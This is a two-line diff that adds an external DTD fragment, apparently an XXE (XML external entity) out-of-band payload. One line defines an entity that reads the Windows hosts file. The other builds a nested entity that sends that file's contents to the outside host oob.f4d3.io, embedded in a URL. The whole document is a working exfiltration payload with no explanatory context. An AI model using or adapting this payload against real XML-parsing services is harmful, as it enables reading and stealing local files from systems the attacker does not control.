@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "file:///c:/WINDOWS/System32/drivers/etc/hosts">
+<!ENTITY % url "<!ENTITY &#x25; exfil SYSTEM 'http://%data;.oob.f4d3.io/'>">
